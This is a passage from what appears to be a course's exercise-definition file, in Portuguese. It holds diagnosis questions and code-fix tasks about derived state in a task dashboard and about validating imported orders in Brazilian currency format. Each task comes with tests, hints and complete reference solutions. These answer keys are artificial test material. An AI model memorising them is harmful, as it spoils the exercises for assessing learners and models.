  <button type="submit">Finalizar pedido</button>
</form>`,
      },
      {
        type: 'paragraph',
        text: 'Cada correção é um atributo ou um elemento nativo: nenhuma linha de JavaScript. O cupom continua precisando de um listener para ser aplicado, mas agora sem o risco de enviar o pedido.',
      },
    ],
  },
  // ---------- Mission: dashboard state ----------
  {
    id: 'mission-dashboard-diagnosis',
    kind: 'multiple-choice',
    title: 'De onde vêm os números errados?',
    difficulty: 'intermediate',
    conceptIds: ['arch-derived-state', 'js-mutability'],
    prompt: [
      {
        type: 'paragraph',
        text: 'Este é o estado atual do painel. Marque todas as causas dos sintomas.',
      },
      {
        type: 'code',
        language: 'javascript',
        code: `function criarPainel() {
  const lista = [];
  let pendentes = 0;
  let concluidas = 0;
  return {
    adicionar(titulo) { lista.push({ id: lista.length + 1, titulo, feita: false }); pendentes++; },
    concluir(id) { const t = lista.find((t) => t.id === id); t.feita = true; pendentes--; concluidas++; },
    remover(id) { lista.splice(lista.findIndex((t) => t.id === id), 1); },
    tarefas: () => lista,
    total: () => lista.length,
    pendentes: () => pendentes,
    concluidas: () => concluidas,
  };
}`,
      },
    ],
    options: [
      {
        id: 'counters',
        text: 'pendentes e concluidas são cópias guardadas: remover não as atualiza, e concluir duas vezes conta duas vezes.',
        explanation:
          'Correto. Três lugares guardam a mesma informação (a lista e dois contadores), e cada método precisa lembrar de atualizar todos. Derivados da lista, eles não conseguem discordar.',
      },
      {
        id: 'exposed-list',
        text: 'tarefas() devolve a própria lista interna: ordenar o resultado para exibir reordena o painel.',
        explanation:
          'Correto. sort altera o array, e quem chamou recebeu a referência do estado interno.',
      },
      {
        id: 'ids',
        text: 'O id é lista.length + 1: depois de remover uma tarefa, o próximo id pode repetir um existente.',
        explanation:
          'Correto. Com três tarefas (1, 2, 3), remover a 1 e adicionar outra gera o id 3 de novo. Um contador próprio de ids, que nunca diminui, resolve.',
      },
      {
        id: 'closure',
        text: 'Variáveis dentro de criarPainel são apagadas depois que a função termina.',
        explanation:
          'Incorreto. É uma closure: as variáveis continuam vivas enquanto o objeto devolvido existir (lição de closures).',
      },
    ],
    correctOptionIds: ['counters', 'exposed-list', 'ids'],
    hints: [
      'Há três causas corretas.',
      'Simule: adicione três, remova a primeira, adicione mais uma.',
    ],
    solution: [
      {
        type: 'paragraph',
        text: 'Contadores duplicados, lista interna exposta e ids derivados de um valor que diminui.',
      },
    ],
  },
  {
    id: 'mission-dashboard-fix',
    kind: 'code',
    language: 'javascript',
    title: 'Uma fonte de verdade para o painel',
    difficulty: 'intermediate',
    conceptIds: ['arch-derived-state', 'js-mutability'],
    prompt: [
      {
        type: 'paragraph',
        text: 'Reescreva criarPainel() mantendo a mesma interface: adicionar(titulo) devolve o id criado; concluir(id) e remover(id) não devolvem nada; tarefas(), total(), pendentes() e concluidas() leem o estado.',
      },
    ],
    requirements: [
      'Ids começam em 1, crescem de um em um e nunca se repetem, mesmo depois de remover.',
      'total, pendentes e concluidas são calculados a partir da lista (nenhum contador guardado).',
      'Concluir uma tarefa já concluída, ou um id inexistente, não muda nada nem lança erro; remover um id inexistente também não.',
      'tarefas() devolve cópias: alterar o array ou os objetos devolvidos não altera o painel.',
      'tarefas() mantém a ordem de criação.',
    ],
    examples: [
      {
        input:
          "const p = criarPainel(); p.adicionar('A'); p.adicionar('B'); p.concluir(1); p.concluir(1);",
        output: 'p.total() 2, p.pendentes() 1, p.concluidas() 1',
      },
    ],
    starterCode: `function criarPainel() {
  const lista = [];
  let pendentes = 0;
  let concluidas = 0;
  return {
    adicionar(titulo) { lista.push({ id: lista.length + 1, titulo, feita: false }); pendentes++; },
    concluir(id) { const t = lista.find((t) => t.id === id); t.feita = true; pendentes--; concluidas++; },
    remover(id) { lista.splice(lista.findIndex((t) => t.id === id), 1); },
    tarefas: () => lista,
    total: () => lista.length,
    pendentes: () => pendentes,
    concluidas: () => concluidas,
  };
}
`,
    tests: [
      {
        id: 'scenario',
        description: 'Adicionar três, concluir uma duas vezes e remover uma pendente: 2, 1, 1',
        source:
          "const p = criarPainel(); const a = p.adicionar('A'); const b = p.adicionar('B'); p.adicionar('C'); p.concluir(a); p.concluir(a); p.remover(b); expect([p.total(), p.pendentes(), p.concluidas()]).toEqual([2, 1, 1]);",
      },
      {
        id: 'ids',
        description: 'Ids começam em 1 e nunca se repetem',
        source:
          "const p = criarPainel(); expect(p.adicionar('A')).toBe(1); expect(p.adicionar('B')).toBe(2); p.remover(1); expect(p.adicionar('C')).toBe(3); expect(p.tarefas().map((t) => t.id)).toEqual([2, 3]);",
      },
      {
        id: 'missing',
        description: 'Ids inexistentes não mudam nada nem lançam erro',
        source:
          "const p = criarPainel(); p.adicionar('A'); p.concluir(99); p.remover(99); expect([p.total(), p.pendentes(), p.concluidas()]).toEqual([1, 1, 0]); expect(p.tarefas().map((t) => t.titulo)).toEqual(['A']);",
      },
      {
        id: 'remove-done',
        description: 'Remover uma tarefa concluída atualiza as concluídas',
        source:
          "const p = criarPainel(); const a = p.adicionar('A'); p.adicionar('B'); p.concluir(a); p.remover(a); expect([p.total(), p.pendentes(), p.concluidas()]).toEqual([1, 1, 0]);",
      },
      {
        id: 'array-copy',
        description: 'Ordenar ou alterar o array devolvido não altera o painel',
        source:
          "const p = criarPainel(); p.adicionar('B'); p.adicionar('A'); const l = p.tarefas(); l.sort((x, y) => x.titulo.localeCompare(y.titulo)); l.push({ id: 9, titulo: 'X', feita: false }); expect(p.tarefas().map((t) => t.titulo)).toEqual(['B', 'A']); expect(p.total()).toBe(2);",
      },
      {
        id: 'object-copy',
        description: 'Alterar um objeto devolvido não altera a tarefa',
        source:
          "const p = criarPainel(); p.adicionar('A'); p.tarefas()[0].feita = true; p.tarefas()[0].titulo = 'Z'; expect(p.concluidas()).toBe(0); expect(p.tarefas()[0].titulo).toBe('A');",
      },
    ],
    hints: [
      'Guarde só a lista e um contador de ids (proximoId) que nunca diminui.',
      'pendentes: () => lista.filter((t) => !t.feita).length.',
      'Cópia de cada objeto: lista.map((t) => ({ ...t })).',
    ],
    solution: [
      {
        type: 'code',
        language: 'javascript',
        code: `function criarPainel() {
  let lista = [];
  let proximoId = 1; // nunca diminui: ids não se repetem

  return {
    adicionar(titulo) {
      const id = proximoId++;
      lista = [...lista, { id, titulo, feita: false }];
      return id;
    },
    concluir(id) {
      // idempotente: concluir de novo, ou um id inexistente, não muda nada
      lista = lista.map((t) => (t.id === id ? { ...t, feita: true } : t));
    },
    remover(id) {
      lista = lista.filter((t) => t.id !== id);
    },
    tarefas: () => lista.map((t) => ({ ...t })), // cópias: ninguém altera o estado por fora
    total: () => lista.length,
    pendentes: () => lista.filter((t) => !t.feita).length,
    concluidas: () => lista.filter((t) => t.feita).length,
  };
}`,
      },
      {
        type: 'paragraph',
        text: 'O estado mínimo é a lista e o próximo id; todo o resto é derivado. As operações substituem a lista em vez de alterá-la, como signal.update faz no Angular, e a leitura entrega cópias. Num service Angular, os três números seriam computed, e a lista, um signal exposto com asReadonly().',
      },
    ],
  },
  // ---------- Mission: order import ----------
  {
    id: 'mission-import-diagnosis',
    kind: 'multiple-choice',
    title: 'Por que a importação mente?',
    difficulty: 'intermediate',
    conceptIds: ['js-numbers', 'js-errors'],
    prompt: [
      { type: 'paragraph', text: 'Esta é a função atual. Marque todas as causas dos sintomas.' },
      {
        type: 'code',
        language: 'javascript',
        code: `const STATUS = ['pendente', 'pago', 'cancelado'];

function importarPedidos(linhas) {
  const pedidos = [];
  for (const linha of linhas) {
    try {
      pedidos.push({
        id: linha.id,
        totalCentavos: parseFloat(linha.total.replace(',', '.')) * 100,
        status: linha.status || 'pendente',
      });
    } catch (erro) {}
  }
  return pedidos;
}`,
      },
    ],
    options: [
      {
        id: 'thousands',
        text: 'replace troca só a primeira vírgula e mantém o ponto de milhar: "1.234,56" vira "1.234.56", e parseFloat lê só 1.234.',
        explanation:
          'Correto. Medido: o resultado foi 123.4 centavos, mil vezes menor, sem nenhum erro.',
      },
      {
        id: 'float',
        text: 'Multiplicar um float por 100 não dá um inteiro exato: "19,90" vira 1989.9999999999998.',
        explanation:
          'Correto. Medido no Node. Dinheiro se converte do texto direto para centavos inteiros.',
      },
      {
        id: 'status',
        text: 'O status não é validado contra STATUS: "estornado" e "PAGO" entram como se fossem válidos.',
        explanation: 'Correto. A lista existe, mas ninguém a consulta.',
      },
      {
        id: 'catch',
        text: 'O catch vazio descarta a linha com erro (por exemplo, total ausente) sem registrar nada.',
        explanation: 'Correto. É por isso que linhas "somem": o erro acontece e é engolido.',
      },
      {
        id: 'for-of',
        text: 'for...of pula linhas quando o array tem mais de 100 itens.',
        explanation: 'Incorreto. for...of percorre todos os itens.',
      },
    ],
    correctOptionIds: ['thousands', 'float', 'status', 'catch'],
    hints: [
      'Há quatro causas corretas.',
      'Rode a função com "1.234,56", "19,90", um status inventado e uma linha sem total.',
    ],
    solution: [
      {
        type: 'paragraph',
        text: 'Conversão de texto com regras erradas, ponto flutuante, falta de validação do status e um catch que esconde as falhas.',
      },
    ],
  },
  {
    id: 'mission-import-fix',
    kind: 'code',
    language: 'javascript',
    title: 'Importar só o que é válido, e relatar o resto',
    difficulty: 'intermediate',
    conceptIds: ['js-numbers', 'js-errors', 'ts-const-satisfies'],
    prompt: [
      {
        type: 'paragraph',
        text: 'Reescreva importarPedidos(linhas) para devolver { pedidos, erros }. Cada linha vira um pedido { id, totalCentavos, status } ou um erro { linha, motivo }, em que linha é o número da linha a partir de 1.',
      },
    ],
    requirements: [
      'Linha que não é um objeto: motivo "linha inválida".',
      'id ausente ou vazio (depois de trim): motivo "id ausente".',
      'total precisa ser texto no formato brasileiro, como "19,90", "1.234,56" ou "10" (até duas casas decimais, milhar opcional com ponto); senão, motivo "total inválido". Converta para centavos sem ponto flutuante.',
      'status ausente ou vazio vira "pendente"; um status que não está na lista STATUS dá o motivo "status inválido".',
      'As verificações seguem essa ordem, e cada linha recebe só o primeiro motivo.',
      'Nenhuma linha some: pedidos.length + erros.length é igual ao número de linhas.',
    ],
    examples: [
      {
        input:
          "importarPedidos([{ id: 'A1', total: '1.234,56', status: 'pago' }, { id: 'A2', total: '10', status: 'estornado' }])",
        output:
          "{ pedidos: [{ id: 'A1', totalCentavos: 123456, status: 'pago' }], erros: [{ linha: 2, motivo: 'status inválido' }] }",
      },
    ],
    starterCode: `const STATUS = ['pendente', 'pago', 'cancelado'];

function importarPedidos(linhas) {
  const pedidos = [];
  for (const linha of linhas) {
    try {
      pedidos.push({
        id: linha.id,
        totalCentavos: parseFloat(linha.total.replace(',', '.')) * 100,
        status: linha.status || 'pendente',
      });
    } catch (erro) {}
  }
  return pedidos;
}
`,
    tests: [
      {
        id: 'cents',
        description: 'Totais brasileiros viram centavos exatos',
        source:
          "const r = importarPedidos([{ id: 'A', total: '1.234,56', status: 'pago' }, { id: 'B', total: '19,90', status: 'pago' }, { id: 'C', total: '10', status: 'pago' }, { id: 'D', total: '0,5', status: 'pago' }]); expect(r.pedidos.map((p) => p.totalCentavos)).toEqual([123456, 1990, 1000, 50]); expect(r.erros).toEqual([]);",
      },
      {
        id: 'status',
        description: 'Status fora da lista é recusado; ausente vira pendente',
        source:
          "const r = importarPedidos([{ id: 'A', total: '1', status: 'estornado' }, { id: 'B', total: '1', status: 'PAGO' }, { id: 'C', total: '1' }, { id: 'D', total: '1', status: '' }]); expect(r.erros).toEqual([{ linha: 1, motivo: 'status inválido' }, { linha: 2, motivo: 'status inválido' }]); expect(r.pedidos.map((p) => p.status)).toEqual(['pendente', 'pendente']);",
      },
      {
        id: 'total',
        description: 'Totais inválidos são recusados',
        source:
          "const linhas = ['', 'abc', '10,555', '1.23,00', '-5', '12px'].map((total, i) => ({ id: 'P' + i, total, status: 'pago' })); linhas.push({ id: 'X', status: 'pago' }); linhas.push({ id: 'Y', total: 19.9, status: 'pago' }); const r = importarPedidos(linhas); expect(r.pedidos).toEqual([]); expect(r.erros.every((e) => e.motivo === 'total inválido')).toBe(true); expect(r.erros.length).toBe(8);",
      },
      {
        id: 'order',
        description: 'Um motivo por linha, na ordem das verificações',
        source:
          "const r = importarPedidos([null, 'texto', { total: 'abc', status: 'x' }, { id: '  ', total: '1' }, { id: 'Z', total: 'abc', status: 'x' }]); expect(r.erros).toEqual([{ linha: 1, motivo: 'linha inválida' }, { linha: 2, motivo: 'linha inválida' }, { linha: 3, motivo: 'id ausente' }, { linha: 4, motivo: 'id ausente' }, { linha: 5, motivo: 'total inválido' }]);",
      },
      {
        id: 'nothing-lost',
        description: 'Nenhuma linha some',
        source:
          "const linhas = [{ id: 'A', total: '1', status: 'pago' }, null, { id: 'B', total: 'x' }, { id: 'C', total: '2,00' }]; const r = importarPedidos(linhas); expect(r.pedidos.length + r.erros.length).toBe(linhas.length); expect(r.pedidos.map((p) => p.id)).toEqual(['A', 'C']);",
      },
    ],
    hints: [
      'Escreva funções pequenas: paraCentavos(texto) devolve um inteiro ou null, e motivoDaLinha(linha) devolve o primeiro problema ou null.',
      'Formato do total: /^(\\d{1,3}(\\.\\d{3})+|\\d+)(,\\d{1,2})?$/.',
      'Não precisa de try/catch: as verificações tornam os erros esperados explícitos.',
    ],
    solution: [
      {
        type: 'code',
        language: 'javascript',
        code: `const STATUS = ['pendente', 'pago', 'cancelado'];
const FORMATO = /^(\\d{1,3}(\\.\\d{3})+|\\d+)(,\\d{1,2})?$/;

function paraCentavos(texto) {
  if (typeof texto !== 'string' || !FORMATO.test(texto.trim())) return null;
  const [inteiro, decimais = ''] = texto.trim().replaceAll('.', '').split(',');
  return Number(inteiro) * 100 + Number(decimais.padEnd(2, '0')); // só inteiros
}

function importarPedidos(linhas) {
  const pedidos = [];
  const erros = [];

  linhas.forEach((linha, i) => {
    const erro = (motivo) => erros.push({ linha: i + 1, motivo });
    if (typeof linha !== 'object' || linha === null) return erro('linha inválida');

    const id = typeof linha.id === 'string' ? linha.id.trim() : '';
    if (!id) return erro('id ausente');

    const totalCentavos = paraCentavos(linha.total);
    if (totalCentavos === null) return erro('total inválido');

    const status = linha.status || 'pendente';
    if (!STATUS.includes(status)) return erro('status inválido');

    pedidos.push({ id, totalCentavos, status });
  });

  return { pedidos, erros };
}`,
      },
      {
        type: 'paragraph',
        text: 'Cada linha termina num de dois lugares, e nunca em nenhum. Os erros esperados viraram verificações explícitas, então o try/catch saiu: um erro inesperado (um bug) volta a aparecer em vez de ser engolido. O total vai do texto aos centavos sem passar por float, e STATUS decide sozinha o que é válido.',
      },
    ],
  },
];
